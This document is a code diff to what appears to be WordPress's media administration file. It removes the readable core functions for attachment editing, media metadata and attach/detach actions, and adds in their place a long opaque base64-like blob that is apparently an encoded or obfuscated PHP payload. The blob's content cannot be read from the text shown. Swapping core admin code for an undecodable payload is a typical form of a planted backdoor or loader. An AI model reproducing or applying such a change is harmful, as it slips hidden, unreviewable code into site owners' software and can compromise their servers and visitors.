-		$thumb_id = get_post_thumbnail_id( $attachment_id );
-		if ( ! empty( $thumb_id ) ) {
-			$attr['poster'] = wp_get_attachment_url( $thumb_id );
-		}
-
-		echo wp_video_shortcode( $attr );
-
-	elseif ( isset( $thumb_url[0] ) ):
-
-		?>
-		<div class="wp_attachment_image wp-clearfix" id="media-head-<?php echo $attachment_id; ?>">
-			<p id="thumbnail-head-<?php echo $attachment_id; ?>">
-				<img class="thumbnail" src="<?php echo set_url_scheme( $thumb_url[0] ); ?>" style="max-width:100%" alt="" />
-			</p>
-		</div>
-		<?php
-
-	else:
-
-		/**
-		 * Fires when an attachment type can't be rendered in the edit form.
-		 *
-		 * @since 4.6.0
-		 *
-		 * @param WP_Post $post A post object.
-		 */
-		do_action( 'wp_edit_form_attachment_display', $post );
-
-	endif; ?>
-	</div>
-	<div class="wp_attachment_details edit-form-section">
-		<p>
-			<label for="attachment_caption"><strong><?php _e( 'Caption' ); ?></strong></label><br />
-			<textarea class="widefat" name="excerpt" id="attachment_caption"><?php echo $post->post_excerpt; ?></textarea>
-		</p>
-
-
-	<?php if ( 'image' === substr( $post->post_mime_type, 0, 5 ) ) : ?>
-		<p>
-			<label for="attachment_alt"><strong><?php _e( 'Alternative Text' ); ?></strong></label><br />
-			<input type="text" class="widefat" name="_wp_attachment_image_alt" id="attachment_alt" value="<?php echo esc_attr( $alt_text ); ?>" />
-		</p>
-	<?php endif; ?>
-
-	<?php
-		$quicktags_settings = array( 'buttons' => 'strong,em,link,block,del,ins,img,ul,ol,li,code,close' );
-		$editor_args = array(
-			'textarea_name' => 'content',
-			'textarea_rows' => 5,
-			'media_buttons' => false,
-			'tinymce' => false,
-			'quicktags' => $quicktags_settings,
-		);
-	?>
-
-	<label for="attachment_content"><strong><?php _e( 'Description' ); ?></strong><?php
-	if ( preg_match( '#^(audio|video)/#', $post->post_mime_type ) ) {
-		echo ': ' . __( 'Displayed on attachment pages.' );
-	} ?></label>
-	<?php wp_editor( $post->post_content, 'attachment_content', $editor_args ); ?>
-
-	</div>
-	<?php
-	$extras = get_compat_media_markup( $post->ID );
-	echo $extras['item'];
-	echo '<input type="hidden" id="image-edit-context" value="edit-attachment" />' . "\n";
-}
-
-/**
- * Displays non-editable attachment metadata in the publish meta box.
- *
- * @since 3.5.0
- */
-function attachment_submitbox_metadata() {
-	$post = get_post();
-
-	$file = get_attached_file( $post->ID );
-	$filename = esc_html( wp_basename( $file ) );
-
-	$media_dims = '';
-	$meta = wp_get_attachment_metadata( $post->ID );
-	if ( isset( $meta['width'], $meta['height'] ) )
-		$media_dims .= "<span id='media-dims-$post->ID'>{$meta['width']}&nbsp;&times;&nbsp;{$meta['height']}</span> ";
-	/** This filter is documented in wp-admin/includes/media.php */
-	$media_dims = apply_filters( 'media_meta', $media_dims, $post );
-
-	$att_url = wp_get_attachment_url( $post->ID );
-?>
-	<div class="misc-pub-section misc-pub-attachment">
-		<label for="attachment_url"><?php _e( 'File URL:' ); ?></label>
-		<input type="text" class="widefat urlfield" readonly="readonly" name="attachment_url" id="attachment_url" value="<?php echo esc_attr( $att_url ); ?>" />
-	</div>
-	<div class="misc-pub-section misc-pub-filename">
-		<?php _e( 'File name:' ); ?> <strong><?php echo $filename; ?></strong>
-	</div>
-	<div class="misc-pub-section misc-pub-filetype">
-		<?php _e( 'File type:' ); ?> <strong><?php
-			if ( preg_match( '/^.*?\.(\w+)$/', get_attached_file( $post->ID ), $matches ) ) {
-				echo esc_html( strtoupper( $matches[1] ) );
-				list( $mime_type ) = explode( '/', $post->post_mime_type );
-				if ( $mime_type !== 'image' && ! empty( $meta['mime_type'] ) ) {
-					if ( $meta['mime_type'] !== "$mime_type/" . strtolower( $matches[1] ) ) {
-						echo ' (' . $meta['mime_type'] . ')';
-					}
-				}
-			} else {
-				echo strtoupper( str_replace( 'image/', '', $post->post_mime_type ) );
-			}
-		?></strong>
-	</div>
-
-	<?php
-		$file_size = false;
-
-		if ( isset( $meta['filesize'] ) )
-			$file_size = $meta['filesize'];
-		elseif ( file_exists( $file ) )
-			$file_size = filesize( $file );
-
-		if ( ! empty( $file_size ) ) : ?>
-			<div class="misc-pub-section misc-pub-filesize">
-				<?php _e( 'File size:' ); ?> <strong><?php echo size_format( $file_size ); ?></strong>
-			</div>
-			<?php
-		endif;
-
-	if ( preg_match( '#^(audio|video)/#', $post->post_mime_type ) ) {
-		$fields = array(
-			'length_formatted' => __( 'Length:' ),
-			'bitrate'          => __( 'Bitrate:' ),
-		);
-
-		/**
-		 * Filters the audio and video metadata fields to be shown in the publish meta box.
-		 *
-		 * The key for each item in the array should correspond to an attachment
-		 * metadata key, and the value should be the desired label.
-		 *
-		 * @since 3.7.0
-		 * @since 4.9.0 Added the `$post` parameter.
-		 *
-		 * @param array   $fields An array of the attachment metadata keys and labels.
-		 * @param WP_Post $post   WP_Post object for the current attachment.
-		 */
-		$fields = apply_filters( 'media_submitbox_misc_sections', $fields, $post );
-
-		foreach ( $fields as $key => $label ) {
-			if ( empty( $meta[ $key ] ) ) {
-				continue;
-			}
-	?>
-		<div class="misc-pub-section misc-pub-mime-meta misc-pub-<?php echo sanitize_html_class( $key ); ?>">
-			<?php echo $label ?> <strong><?php
-				switch ( $key ) {
-					case 'bitrate' :
-						echo round( $meta['bitrate'] / 1000 ) . 'kb/s';
-						if ( ! empty( $meta['bitrate_mode'] ) ) {
-							echo ' ' . strtoupper( esc_html( $meta['bitrate_mode'] ) );
-						}
-						break;
-					default:
-						echo esc_html( $meta[ $key ] );
-						break;
-				}
-			?></strong>
-		</div>
-	<?php
-		}
-
-		$fields = array(
-			'dataformat' => __( 'Audio Format:' ),
-			'codec'      => __( 'Audio Codec:' )
-		);
-
-		/**
-		 * Filters the audio attachment metadata fields to be shown in the publish meta box.
-		 *
-		 * The key for each item in the array should correspond to an attachment
-		 * metadata key, and the value should be the desired label.
-		 *
-		 * @since 3.7.0
-		 * @since 4.9.0 Added the `$post` parameter.
-		 *
-		 * @param array   $fields An array of the attachment metadata keys and labels.
-		 * @param WP_Post $post   WP_Post object for the current attachment.
-		 */
-		$audio_fields = apply_filters( 'audio_submitbox_misc_sections', $fields, $post );
-
-		foreach ( $audio_fields as $key => $label ) {
-			if ( empty( $meta['audio'][ $key ] ) ) {
-				continue;
-			}
-	?>
-		<div class="misc-pub-section misc-pub-audio misc-pub-<?php echo sanitize_html_class( $key ); ?>">
-			<?php echo $label; ?> <strong><?php echo esc_html( $meta['audio'][$key] ); ?></strong>
-		</div>
-	<?php
-		}
-
-	}
-
-	if ( $media_dims ) : ?>
-	<div class="misc-pub-section misc-pub-dimensions">
-		<?php _e( 'Dimensions:' ); ?> <strong><?php echo $media_dims; ?></strong>
-	</div>
-<?php
-	endif;
-}
-
-/**
- * Parse ID3v2, ID3v1, and getID3 comments to extract usable data
- *
- * @since 3.6.0
- *
- * @param array $metadata An existing array with data
- * @param array $data Data supplied by ID3 tags
- */
-function wp_add_id3_tag_data( &$metadata, $data ) {
-	foreach ( array( 'id3v2', 'id3v1' ) as $version ) {
-		if ( ! empty( $data[$version]['comments'] ) ) {
-			foreach ( $data[$version]['comments'] as $key => $list ) {
-				if ( 'length' !== $key && ! empty( $list ) ) {
-					$metadata[$key] = wp_kses_post( reset( $list ) );
-					// Fix bug in byte stream analysis.
-					if ( 'terms_of_use' === $key && 0 === strpos( $metadata[$key], 'yright notice.' ) )
-						$metadata[$key] = 'Cop' . $metadata[$key];
-				}
-			}
-			break;
-		}
-	}
-
-	if ( ! empty( $data['id3v2']['APIC'] ) ) {
-		$image = reset( $data['id3v2']['APIC']);
-		if ( ! empty( $image['data'] ) ) {
-			$metadata['image'] = array(
-				'data' => $image['data'],
-				'mime' => $image['image_mime'],
-				'width' => $image['image_width'],
-				'height' => $image['image_height']
-			);
-		}
-	} elseif ( ! empty( $data['comments']['picture'] ) ) {
-		$image = reset( $data['comments']['picture'] );
-		if ( ! empty( $image['data'] ) ) {
-			$metadata['image'] = array(
-				'data' => $image['data'],
-				'mime' => $image['image_mime']
-			);
-		}
-	}
-}
-
-/**
- * Retrieve metadata from a video file's ID3 tags
- *
- * @since 3.6.0
- *
- * @param string $file Path to file.
- * @return array|bool Returns array of metadata, if found.
- */
-function wp_read_video_metadata( $file ) {
-	if ( ! file_exists( $file ) ) {
-		return false;
-	}
-
-	$metadata = array();
-
-	if ( ! defined( 'GETID3_TEMP_DIR' ) ) {
-		define( 'GETID3_TEMP_DIR', get_temp_dir() );
-	}
-
-	if ( ! class_exists( 'getID3', false ) ) {
-		require( ABSPATH . WPINC . '/ID3/getid3.php' );
-	}
-	$id3 = new getID3();
-	$data = $id3->analyze( $file );
-
-	if ( isset( $data['video']['lossless'] ) )
-		$metadata['lossless'] = $data['video']['lossless'];
-	if ( ! empty( $data['video']['bitrate'] ) )
-		$metadata['bitrate'] = (int) $data['video']['bitrate'];
-	if ( ! empty( $data['video']['bitrate_mode'] ) )
-		$metadata['bitrate_mode'] = $data['video']['bitrate_mode'];
-	if ( ! empty( $data['filesize'] ) )
-		$metadata['filesize'] = (int) $data['filesize'];
-	if ( ! empty( $data['mime_type'] ) )
-		$metadata['mime_type'] = $data['mime_type'];
-	if ( ! empty( $data['playtime_seconds'] ) )
-		$metadata['length'] = (int) round( $data['playtime_seconds'] );
-	if ( ! empty( $data['playtime_string'] ) )
-		$metadata['length_formatted'] = $data['playtime_string'];
-	if ( ! empty( $data['video']['resolution_x'] ) )
-		$metadata['width'] = (int) $data['video']['resolution_x'];
-	if ( ! empty( $data['video']['resolution_y'] ) )
-		$metadata['height'] = (int) $data['video']['resolution_y'];
-	if ( ! empty( $data['fileformat'] ) )
-		$metadata['fileformat'] = $data['fileformat'];
-	if ( ! empty( $data['video']['dataformat'] ) )
-		$metadata['dataformat'] = $data['video']['dataformat'];
-	if ( ! empty( $data['video']['encoder'] ) )
-		$metadata['encoder'] = $data['video']['encoder'];
-	if ( ! empty( $data['video']['codec'] ) )
-		$metadata['codec'] = $data['video']['codec'];
-
-	if ( ! empty( $data['audio'] ) ) {
-		unset( $data['audio']['streams'] );
-		$metadata['audio'] = $data['audio'];
-	}
-
-	if ( empty( $metadata['created_timestamp'] ) ) {
-		$created_timestamp = wp_get_media_creation_timestamp( $data );
-
-		if ( $created_timestamp !== false ) {
-			$metadata['created_timestamp'] = $created_timestamp;
-		}
-	}
-
-	wp_add_id3_tag_data( $metadata, $data );
-
-	$file_format = isset( $metadata['fileformat'] ) ? $metadata['fileformat'] : null;
-
-	/**
-	 * Filters the array of metadata retrieved from a video.
-	 *
-	 * In core, usually this selection is what is stored.
-	 * More complete data can be parsed from the `$data` parameter.
-	 *
-	 * @since 4.9.0
-	 *
-	 * @param array  $metadata       Filtered Video metadata.
-	 * @param string $file           Path to video file.
-	 * @param string $file_format    File format of video, as analyzed by getID3.
-	 * @param string $data           Raw metadata from getID3.
-	 */
-	return apply_filters( 'wp_read_video_metadata', $metadata, $file, $file_format, $data );
-}
-
-/**
- * Retrieve metadata from a audio file's ID3 tags
- *
- * @since 3.6.0
- *
- * @param string $file Path to file.
- * @return array|bool Returns array of metadata, if found.
- */
-function wp_read_audio_metadata( $file ) {
-	if ( ! file_exists( $file ) ) {
-		return false;
-	}
-	$metadata = array();
-
-	if ( ! defined( 'GETID3_TEMP_DIR' ) ) {
-		define( 'GETID3_TEMP_DIR', get_temp_dir() );
-	}
-
-	if ( ! class_exists( 'getID3', false ) ) {
-		require( ABSPATH . WPINC . '/ID3/getid3.php' );
-	}
-	$id3 = new getID3();
-	$data = $id3->analyze( $file );
-
-	if ( ! empty( $data['audio'] ) ) {
-		unset( $data['audio']['streams'] );
-		$metadata = $data['audio'];
-	}
-
-	if ( ! empty( $data['fileformat'] ) )
-		$metadata['fileformat'] = $data['fileformat'];
-	if ( ! empty( $data['filesize'] ) )
-		$metadata['filesize'] = (int) $data['filesize'];
-	if ( ! empty( $data['mime_type'] ) )
-		$metadata['mime_type'] = $data['mime_type'];
-	if ( ! empty( $data['playtime_seconds'] ) )
-		$metadata['length'] = (int) round( $data['playtime_seconds'] );
-	if ( ! empty( $data['playtime_string'] ) )
-		$metadata['length_formatted'] = $data['playtime_string'];
-
-	wp_add_id3_tag_data( $metadata, $data );
-
-	return $metadata;
-}
-
-/**
- * Parse creation date from media metadata.
- *
- * The getID3 library doesn't have a standard method for getting creation dates,
- * so the location of this data can vary based on the MIME type.
- *
- * @since 4.9.0
- *
- * @link https://github.com/JamesHeinrich/getID3/blob/master/structure.txt
- *
- * @param array $metadata The metadata returned by getID3::analyze().
- * @return int|bool A UNIX timestamp for the media's creation date if available
- *                  or a boolean FALSE if a timestamp could not be determined.
- */
-function wp_get_media_creation_timestamp( $metadata ) {
-	$creation_date = false;
-
-	if ( empty( $metadata['fileformat'] ) ) {
-		return $creation_date;
-	}
-
-	switch ( $metadata['fileformat'] ) {
-		case 'asf':
-			if ( isset( $metadata['asf']['file_properties_object']['creation_date_unix'] ) ) {
-				$creation_date = (int) $metadata['asf']['file_properties_object']['creation_date_unix'];
-			}
-			break;
-
-		case 'matroska':
-		case 'webm':
-			if ( isset( $metadata['matroska']['comments']['creation_time']['0'] ) ) {
-				$creation_date = strtotime( $metadata['matroska']['comments']['creation_time']['0'] );
-			}
-			elseif ( isset( $metadata['matroska']['info']['0']['DateUTC_unix'] ) ) {
-				$creation_date = (int) $metadata['matroska']['info']['0']['DateUTC_unix'];
-			}
-			break;
-
-		case 'quicktime':
-		case 'mp4':
-			if ( isset( $metadata['quicktime']['moov']['subatoms']['0']['creation_time_unix'] ) ) {
-				$creation_date = (int) $metadata['quicktime']['moov']['subatoms']['0']['creation_time_unix'];
-			}
-			break;
-	}
-
-	return $creation_date;
-}
-
-/**
- * Encapsulate logic for Attach/Detach actions
- *
- * @since 4.2.0
- *
- * @global wpdb $wpdb WordPress database abstraction object.
- *
- * @param int    $parent_id Attachment parent ID.
- * @param string $action    Optional. Attach/detach action. Accepts 'attach' or 'detach'.
- *                          Default 'attach'.
- */
-function wp_media_attach_action( $parent_id, $action = 'attach' ) {
-	global $wpdb;
-
-	if ( ! $parent_id ) {
-		return;
-	}
-
-	if ( ! current_user_can( 'edit_post', $parent_id ) ) {
-		wp_die( __( 'Sorry, you are not allowed to edit this post.' ) );
-	}
-	$ids = array();
-	foreach ( (array) $_REQUEST['media'] as $att_id ) {
-		$att_id = (int) $att_id;
-
-		if ( ! current_user_can( 'edit_post', $att_id ) ) {
-			continue;
-		}
-
-		$ids[] = $att_id;
-	}
-
-	if ( ! empty( $ids ) ) {
-		$ids_string = implode( ',', $ids );
-		if ( 'attach' === $action ) {
-			$result = $wpdb->query( $wpdb->prepare( "UPDATE $wpdb->posts SET post_parent = %d WHERE post_type = 'attachment' AND ID IN ( $ids_string )", $parent_id ) );
-		} else {
-			$result = $wpdb->query( "UPDATE $wpdb->posts SET post_parent = 0 WHERE post_type = 'attachment' AND ID IN ( $ids_string )" );
-		}
-
-		foreach ( $ids as $att_id ) {
-			clean_attachment_cache( $att_id );
-		}
-	}
-
-	if ( isset( $result ) ) {
-		$location = 'upload.php';
-		if ( $referer = wp_get_referer() ) {
-			if ( false !== strpos( $referer, 'upload.php' ) ) {
-				$location = remove_query_arg( array( 'attached', 'detach' ), $referer );
-			}
-		}
-
-		$key = 'attach' === $action ? 'attached' : 'detach';
-		$location = add_query_arg( array( $key => $result ), $location );
-		wp_redirect( $location );
-		exit;
-	}
-}
+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
